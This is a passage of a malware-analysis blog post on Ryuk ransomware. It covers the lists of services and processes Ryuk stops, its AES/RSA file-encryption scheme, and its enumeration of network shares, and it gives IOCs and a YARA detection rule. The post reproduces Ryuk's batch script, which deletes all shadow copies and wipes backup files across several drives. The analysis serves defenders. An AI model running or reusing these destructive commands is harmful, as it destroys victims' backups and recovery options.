        &emsp; &emsp; SQLAgent$VEEAMSQL2008R2 <br />
        &emsp; &emsp; VeeamHvIntegrationSvc <br />
        &emsp; &emsp; swi_update <br />
        &emsp; &emsp; SQLAgent$CXDB <br />
        &emsp; &emsp; SQLAgent$CITRIX_METAFRAME <br />
        &emsp; &emsp; SQL Backups <br />
        &emsp; &emsp; MSSQL$PROD <br />
        &emsp; &emsp; Zoolz 2 Service <br />
        &emsp; &emsp; MSSQLServerADHelper <br /> 
        &emsp; &emsp; SQLAgent$PROD <br /> 
        &emsp; &emsp; msftesql$PROD <br /> 
        &emsp; &emsp; NetMsmqActivator <br />
        &emsp; &emsp; EhttpSrv <br />
        &emsp; &emsp; ekrn <br />
        &emsp; &emsp; ESHASRV <br />
        &emsp; &emsp; MSSQL$SOPHOS <br />
        &emsp; &emsp; SQLAgent$SOPHOS <br />
        &emsp; &emsp; AVP <br />
        &emsp; &emsp; klnagent <br />
        &emsp; &emsp; MSSQL$SQLEXPRESS <br />
        &emsp; &emsp; SQLAgent$SQLEXPRESS <br />
        &emsp; &emsp; wbengine <br />
        &emsp; &emsp; kavfsslp <br />
        &emsp; &emsp; KAVFSGT <br />
        &emsp; &emsp; KAVFS <br />
        &emsp; &emsp; mfefire <br />
</details>
<p><br />And here is the list of processes:</p>

<details style="color: #EEFFFF; font-family: monospace !default; font-size: 0.85em; background: #263238; border: 1px solid #263238; border-radius: 3px; padding: 10px; line-height: 1.8;">
    <summary style="outline: none; cursor: pointer">
        <span style="color: darkgray">
            Expand to see more
        </span><br />
&emsp; &emsp; zoolz.exe <br />
&emsp; &emsp; agntsvc.exe <br />
&emsp; &emsp; dbeng50.exe <br />
&emsp; &emsp; dbsnmp.exe <br />
&emsp; &emsp; encsvc.exe <br />
&emsp; &emsp; excel.exe <br />
&emsp; &emsp; firefoxconfig.exe <br />
&emsp; &emsp; infopath.exe <br />
</summary>
&emsp; &emsp; isqlplussvc.exe <br />
&emsp; &emsp; msaccess.exe <br />
&emsp; &emsp; msftesql.exe <br />
&emsp; &emsp; mspub.exe <br />
&emsp; &emsp; mydesktopqos.exe <br />
&emsp; &emsp; mydesktopservice.exe <br />
&emsp; &emsp; mysqld.exe <br />
&emsp; &emsp; mysqld-nt.exe <br />
&emsp; &emsp; mysqld-opt.exe <br />
&emsp; &emsp; ocautoupds.exe <br />
&emsp; &emsp; ocomm.exe <br />
&emsp; &emsp; ocssd.exe <br />
&emsp; &emsp; onenote.exe <br />
&emsp; &emsp; oracle.exe <br />
&emsp; &emsp; outlook.exe <br />
&emsp; &emsp; powerpnt.exe <br />
&emsp; &emsp; sqbcoreservice.exe <br />
&emsp; &emsp; sqlagent.exe <br />
&emsp; &emsp; sqlbrowser.exe <br />
&emsp; &emsp; sqlservr.exe <br />
&emsp; &emsp; sqlwriter.exe <br />
&emsp; &emsp; steam.exe <br />
&emsp; &emsp; synctime.exe <br />
&emsp; &emsp; tbirdconfig.exe <br />
&emsp; &emsp; thebat.exe <br />
&emsp; &emsp; thebat64.exe <br />
&emsp; &emsp; thunderbird.exe <br />
&emsp; &emsp; visio.exe <br />
&emsp; &emsp; winword.exe <br />
&emsp; &emsp; wordpad.exe <br />
&emsp; &emsp; xfssvccon.exe <br />
&emsp; &emsp; tmlisten.exe <br />
&emsp; &emsp; PccNTMon.exe <br />
&emsp; &emsp; CNTAoSMgr.exe <br />
&emsp; &emsp; Ntrtscan.exe <br />
&emsp; &emsp; mbamtray.exe <br />
</details>
<h2 id="deleting-backups">Deleting Backups</h2>

<p>Ryuk drops a batch script at <code class="language-plaintext highlighter-rouge">C:\Users\Public\window.bat</code> which deletes all shadow copies and possible backups, then the script deletes itself.</p>

<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">vssadmin</span> <span class="kd">Delete</span> <span class="kd">Shadows</span> <span class="na">/all /quiet
</span><span class="nb">vssadmin</span> <span class="kd">resize</span> <span class="kd">shadowstorage</span> <span class="na">/for</span><span class="o">=</span><span class="kd">c</span>: <span class="na">/on</span><span class="o">=</span><span class="kd">c</span>: <span class="na">/maxsize</span><span class="o">=</span><span class="m">401</span><span class="kd">MB</span>
<span class="nb">vssadmin</span> <span class="kd">resize</span> <span class="kd">shadowstorage</span> <span class="na">/for</span><span class="o">=</span><span class="kd">c</span>: <span class="na">/on</span><span class="o">=</span><span class="kd">c</span>: <span class="na">/maxsize</span><span class="o">=</span><span class="kd">unbounded</span>
<span class="nb">vssadmin</span> <span class="kd">resize</span> <span class="kd">shadowstorage</span> <span class="na">/for</span><span class="o">=</span><span class="kd">d</span>: <span class="na">/on</span><span class="o">=</span><span class="kd">d</span>: <span class="na">/maxsize</span><span class="o">=</span><span class="m">401</span><span class="kd">MB</span>
<span class="nb">vssadmin</span> <span class="kd">resize</span> <span class="kd">shadowstorage</span> <span class="na">/for</span><span class="o">=</span><span class="kd">d</span>: <span class="na">/on</span><span class="o">=</span><span class="kd">d</span>: <span class="na">/maxsize</span><span class="o">=</span><span class="kd">unbounded</span>
<span class="nb">vssadmin</span> <span class="kd">resize</span> <span class="kd">shadowstorage</span> <span class="na">/for</span><span class="o">=</span><span class="kd">e</span>: <span class="na">/on</span><span class="o">=</span><span class="kd">e</span>: <span class="na">/maxsize</span><span class="o">=</span><span class="m">401</span><span class="kd">MB</span>
<span class="nb">vssadmin</span> <span class="kd">resize</span> <span class="kd">shadowstorage</span> <span class="na">/for</span><span class="o">=</span><span class="kd">e</span>: <span class="na">/on</span><span class="o">=</span><span class="kd">e</span>: <span class="na">/maxsize</span><span class="o">=</span><span class="kd">unbounded</span>
<span class="nb">vssadmin</span> <span class="kd">resize</span> <span class="kd">shadowstorage</span> <span class="na">/for</span><span class="o">=</span><span class="kd">f</span>: <span class="na">/on</span><span class="o">=</span><span class="kd">f</span>: <span class="na">/maxsize</span><span class="o">=</span><span class="m">401</span><span class="kd">MB</span>
<span class="nb">vssadmin</span> <span class="kd">resize</span> <span class="kd">shadowstorage</span> <span class="na">/for</span><span class="o">=</span><span class="kd">f</span>: <span class="na">/on</span><span class="o">=</span><span class="kd">f</span>: <span class="na">/maxsize</span><span class="o">=</span><span class="kd">unbounded</span>
<span class="nb">vssadmin</span> <span class="kd">resize</span> <span class="kd">shadowstorage</span> <span class="na">/for</span><span class="o">=</span><span class="kd">g</span>: <span class="na">/on</span><span class="o">=</span><span class="kd">g</span>: <span class="na">/maxsize</span><span class="o">=</span><span class="m">401</span><span class="kd">MB</span>
<span class="nb">vssadmin</span> <span class="kd">resize</span> <span class="kd">shadowstorage</span> <span class="na">/for</span><span class="o">=</span><span class="kd">g</span>: <span class="na">/on</span><span class="o">=</span><span class="kd">g</span>: <span class="na">/maxsize</span><span class="o">=</span><span class="kd">unbounded</span>
<span class="nb">vssadmin</span> <span class="kd">resize</span> <span class="kd">shadowstorage</span> <span class="na">/for</span><span class="o">=</span><span class="kd">h</span>: <span class="na">/on</span><span class="o">=</span><span class="kd">h</span>: <span class="na">/maxsize</span><span class="o">=</span><span class="m">401</span><span class="kd">MB</span>
<span class="nb">vssadmin</span> <span class="kd">resize</span> <span class="kd">shadowstorage</span> <span class="na">/for</span><span class="o">=</span><span class="kd">h</span>: <span class="na">/on</span><span class="o">=</span><span class="kd">h</span>: <span class="na">/maxsize</span><span class="o">=</span><span class="kd">unbounded</span>
<span class="nb">vssadmin</span> <span class="kd">Delete</span> <span class="kd">Shadows</span> <span class="na">/all /quiet
</span><span class="nb">del</span> <span class="na">/s /f /q </span><span class="kd">c</span>:\<span class="o">*</span>.VHD <span class="kd">c</span>:\<span class="o">*</span>.bac <span class="kd">c</span>:\<span class="o">*</span>.bak <span class="kd">c</span>:\<span class="o">*</span>.wbcat <span class="kd">c</span>:\<span class="o">*</span>.bkf <span class="kd">c</span>:\Backup<span class="o">*</span>.<span class="o">*</span> <span class="kd">c</span>:\backup<span class="o">*</span>.<span class="o">*</span> <span class="kd">c</span>:\<span class="o">*</span>.set <span class="kd">c</span>:\<span class="o">*</span>.win <span class="kd">c</span>:\<span class="o">*</span>.dsk
<span class="nb">del</span> <span class="na">/s /f /q </span><span class="kd">d</span>:\<span class="o">*</span>.VHD <span class="kd">d</span>:\<span class="o">*</span>.bac <span class="kd">d</span>:\<span class="o">*</span>.bak <span class="kd">d</span>:\<span class="o">*</span>.wbcat <span class="kd">d</span>:\<span class="o">*</span>.bkf <span class="kd">d</span>:\Backup<span class="o">*</span>.<span class="o">*</span> <span class="kd">d</span>:\backup<span class="o">*</span>.<span class="o">*</span> <span class="kd">d</span>:\<span class="o">*</span>.set <span class="kd">d</span>:\<span class="o">*</span>.win <span class="kd">d</span>:\<span class="o">*</span>.dsk
<span class="nb">del</span> <span class="na">/s /f /q </span><span class="kd">e</span>:\<span class="o">*</span>.VHD <span class="kd">e</span>:\<span class="o">*</span>.bac <span class="kd">e</span>:\<span class="o">*</span>.bak <span class="kd">e</span>:\<span class="o">*</span>.wbcat <span class="kd">e</span>:\<span class="o">*</span>.bkf <span class="kd">e</span>:\Backup<span class="o">*</span>.<span class="o">*</span> <span class="kd">e</span>:\backup<span class="o">*</span>.<span class="o">*</span> <span class="kd">e</span>:\<span class="o">*</span>.set <span class="kd">e</span>:\<span class="o">*</span>.win <span class="kd">e</span>:\<span class="o">*</span>.dsk
<span class="nb">del</span> <span class="na">/s /f /q </span><span class="kd">f</span>:\<span class="o">*</span>.VHD <span class="kd">f</span>:\<span class="o">*</span>.bac <span class="kd">f</span>:\<span class="o">*</span>.bak <span class="kd">f</span>:\<span class="o">*</span>.wbcat <span class="kd">f</span>:\<span class="o">*</span>.bkf <span class="kd">f</span>:\Backup<span class="o">*</span>.<span class="o">*</span> <span class="kd">f</span>:\backup<span class="o">*</span>.<span class="o">*</span> <span class="kd">f</span>:\<span class="o">*</span>.set <span class="kd">f</span>:\<span class="o">*</span>.win <span class="kd">f</span>:\<span class="o">*</span>.dsk
<span class="nb">del</span> <span class="na">/s /f /q </span><span class="kd">g</span>:\<span class="o">*</span>.VHD <span class="kd">g</span>:\<span class="o">*</span>.bac <span class="kd">g</span>:\<span class="o">*</span>.bak <span class="kd">g</span>:\<span class="o">*</span>.wbcat <span class="kd">g</span>:\<span class="o">*</span>.bkf <span class="kd">g</span>:\Backup<span class="o">*</span>.<span class="o">*</span> <span class="kd">g</span>:\backup<span class="o">*</span>.<span class="o">*</span> <span class="kd">g</span>:\<span class="o">*</span>.set <span class="kd">g</span>:\<span class="o">*</span>.win <span class="kd">g</span>:\<span class="o">*</span>.dsk
<span class="nb">del</span> <span class="na">/s /f /q </span><span class="kd">h</span>:\<span class="o">*</span>.VHD <span class="kd">h</span>:\<span class="o">*</span>.bac <span class="kd">h</span>:\<span class="o">*</span>.bak <span class="kd">h</span>:\<span class="o">*</span>.wbcat <span class="kd">h</span>:\<span class="o">*</span>.bkf <span class="kd">h</span>:\Backup<span class="o">*</span>.<span class="o">*</span> <span class="kd">h</span>:\backup<span class="o">*</span>.<span class="o">*</span> <span class="kd">h</span>:\<span class="o">*</span>.set <span class="kd">h</span>:\<span class="o">*</span>.win <span class="kd">h</span>:\<span class="o">*</span>.dsk
<span class="nb">del</span> <span class="err">%</span><span class="m">0</span>
</code></pre></div></div>

<h2 id="the-encryption-process">The Encryption Process</h2>

<p>Ryuk uses a multi threading approach for the encryption process, it creates a new thread for each file it encrypts which makes it very fast.</p>

<p>It starts enumerating files using <code class="language-plaintext highlighter-rouge">FindFirstFileW()</code> and <code class="language-plaintext highlighter-rouge">FindNextFileW()</code> then it passes each file name to a new encryption thread. Note that Ryuk avoids encrypting these file extensions:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.dll
.lnk
.hrmlog
.ini
.exe
</code></pre></div></div>

<p>Each encryption thread starts by generating a random 256 AES encryption key using <code class="language-plaintext highlighter-rouge">CryptGenKey()</code>, Ryuk utilizes the WindowsCrypto API for the encryption.</p>

<p><a href="/assets/images/malware-analysis/ryuk-ransomware/16.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/16.png" alt="16" /></a></p>

<p>Then it goes into the typical encryption loop, the files are encrypted in chunks with a chunk size of <code class="language-plaintext highlighter-rouge">1000000 bytes</code>.</p>

<table>
  <tbody>
    <tr>
      <td><a href="/assets/images/malware-analysis/ryuk-ransomware/17.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/17.png" alt="17" /></a></td>
      <td><a href="/assets/images/malware-analysis/ryuk-ransomware/18.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/18.png" alt="18" /></a></td>
    </tr>
  </tbody>
</table>

<p>Finally Ryuk write a metadata block of size <code class="language-plaintext highlighter-rouge">274 bytes</code> at the end of the file. The first <code class="language-plaintext highlighter-rouge">6 bytes</code> are the keyword <code class="language-plaintext highlighter-rouge">HERMES</code>.</p>

<p><a href="/assets/images/malware-analysis/ryuk-ransomware/19.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/19.png" alt="19" /></a></p>

<p>After that, The AES key is encrypted with an RSA public key before it’s written to the end of the file and then exported using <code class="language-plaintext highlighter-rouge">CryptExportKey()</code>, This function generates <code class="language-plaintext highlighter-rouge">12 bytes of Blob information + 256 bytes (the encrypted key)</code>.</p>

<p><a href="/assets/images/malware-analysis/ryuk-ransomware/20.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/20.png" alt="20" /></a></p>

<p>The RSA public key is embedded in the executable, it’s imported using <code class="language-plaintext highlighter-rouge">CryptImportKey()</code> and passed to every encryption thread.</p>

<table>
  <tbody>
    <tr>
      <td><a href="/assets/images/malware-analysis/ryuk-ransomware/21.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/21.png" alt="21" /></a></td>
      <td><a href="/assets/images/malware-analysis/ryuk-ransomware/22.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/22.png" alt="22" /></a></td>
    </tr>
  </tbody>
</table>

<p>We can see at the end of the encryption routine a check if the keyword <code class="language-plaintext highlighter-rouge">HERMES</code> is present at the end of the file (which indicates the file is encrypted).</p>

<p>This check is actually done before encrypting the file to avoid encrypting it twice.</p>

<p><a href="/assets/images/malware-analysis/ryuk-ransomware/23.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/23.png" alt="23" /></a></p>

<p>Here is an example of the complete metadata block:</p>

<p><a href="/assets/images/malware-analysis/ryuk-ransomware/24.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/24.png" alt="24" /></a></p>

<h2 id="encrypting-network-shares">Encrypting Network Shares</h2>

<p>Ryuk enumerates network shares using <code class="language-plaintext highlighter-rouge">WNetOpenEnumW()</code> and <code class="language-plaintext highlighter-rouge">WNetEnumResourceA()</code> respectively.</p>

<p><a href="/assets/images/malware-analysis/ryuk-ransomware/25.png"><img src="/assets/images/malware-analysis/ryuk-ransomware/25.png" alt="25" /></a></p>

<p>For each network resource found, the resource’s name will be appended to a list separated by a semicolon. This list will be used later to encrypt these network shares with the same encryption process above.</p>

<h2 id="iocs">IOCs</h2>

<h4 id="hashes"><u>Hashes</u></h4>

<p>Ryuk: 8b0a5fb13309623c3518473551cb1f55d38d8450129d4a3c16b476f7b2867d7</p>

<p>Dropper: 23f8aa94ffb3c08a62735fe7fee5799880a8f322ce1d55ec49a13a3f85312db2</p>

<h4 id="files"><u>Files</u></h4>

<p>C:\Users\Public\window.bat</p>

<h4 id="registry"><u>Registry</u></h4>

<p>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</p>

<h4 id="emails"><u>Emails</u></h4>

<p>WayneEvenson@protonmail[.]com</p>

<p>WayneEvenson@tutanota[.]com</p>

<h2 id="yara-rule">Yara Rule</h2>

<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">rule</span> <span class="nt">Ryuk</span>
<span class="p">{</span>
    <span class="py">meta</span><span class="p">:</span>
        <span class="n">author</span> <span class="err">=</span> <span class="s1">"N1ght-W0lf"</span>
        <span class="n">description</span> <span class="err">=</span> <span class="s1">"Detect Ryuk Samples"</span>
        <span class="n">date</span> <span class="err">=</span> <span class="s1">"2020-05-08"</span>
    <span class="n">strings</span><span class="p">:</span>
        <span class="err">$</span><span class="n">s1</span> <span class="err">=</span> <span class="s1">"RyukReadMe.txt"</span> <span class="n">ascii</span> <span class="n">wide</span>
        <span class="err">$</span><span class="n">s2</span> <span class="err">=</span> <span class="s1">"No system is safe"</span> <span class="n">ascii</span> <span class="n">wide</span>
        <span class="err">$</span><span class="n">s3</span> <span class="err">=</span> <span class="s1">"svchos"</span> <span class="n">ascii</span> <span class="n">wide</span> <span class="n">fullword</span>
        <span class="err">$</span><span class="n">s4</span> <span class="err">=</span> <span class="s1">"vssadmin Delete Shadows /all /quiet"</span> <span class="n">ascii</span> <span class="n">wide</span>
        <span class="err">$</span><span class="n">s5</span> <span class="err">=</span> <span class="s1">"UNIQUE_ID_DO_NOT_REMOVE"</span> <span class="n">ascii</span> <span class="n">wide</span>
        <span class="err">$</span><span class="n">s7</span> <span class="err">=</span> <span class="s1">"\\users\\Public\\window.bat"</span> <span class="n">ascii</span> <span class="n">wide</span>
        <span class="err">$</span><span class="n">s6</span> <span class="err">=</span> <span class="s1">"HERMES"</span> <span class="n">ascii</span> <span class="n">wide</span>

    <span class="n">condition</span><span class="p">:</span>
        <span class="m">5</span> <span class="n">of</span> <span class="n">them</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="external-references">External References</h2>

<p><a href="https://blog.malwarebytes.com/threat-spotlight/2019/12/threat-spotlight-the-curious-case-of-ryuk-ransomware/">https://blog.malwarebytes.com/threat-spotlight/2019/12/threat-spotlight-the-curious-case-of-ryuk-ransomware/</a></p>

<p><a href="https://research.checkpoint.com/2018/ryuk-ransomware-targeted-campaign-break/">https://research.checkpoint.com/2018/ryuk-ransomware-targeted-campaign-break/</a></p>

<p><a href="https://app.any.run/tasks/81eaa3cf-eb75-411f-adba-b09472927155/">https://app.any.run/tasks/81eaa3cf-eb75-411f-adba-b09472927155/</a></p>

<p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672">https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672</a></p>

<p><a href="https://www.codeproject.com/Articles/1658/Obtain-the-plain-text-session-key-using-CryptoAPI">https://www.codeproject.com/Articles/1658/Obtain-the-plain-text-session-key-using-CryptoAPI</a></p>

        
      </section>

      <footer class="page__meta">
        
        


  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/pages/elbouzarazi/categories/#malware-analysis" class="page__taxonomy-item" rel="tag">Malware Analysis</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-05-05T00:00:00+01:00">May 5, 2020</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/pages/elbouzarazi/binary%20exploitation/asm/" class="pagination--pager" title="Pwnable.kr - asm
">Previous</a>
    
    
      <a href="/pages/elbouzarazi/ctf%20writeups/memlabs-lab1/" class="pagination--pager" title="MemLabs - Lab1
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
      
        
      
        
      
        
      
        
      
        
      
    

    <li><a href="/pages/elbouzarazi/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2024 zakariae Elbouzarazi. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/pages/elbouzarazi/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/pages/elbouzarazi/assets/js/lunr/lunr.min.js"></script>
<script src="/pages/elbouzarazi/assets/js/lunr/lunr-store.js"></script>
<script src="/pages/elbouzarazi/assets/js/lunr/lunr-en.js"></script>




  <script>
  window.ga=function(){ga.q.push(arguments)};ga.q=[];ga.l=+new Date;
  ga('create','UA-165194559-1','auto');
  ga('set', 'anonymizeIp', false);
  ga('send','pageview')
</script>
<script src="https://www.google-analytics.com/analytics.js" async></script>









  </body>
</html>
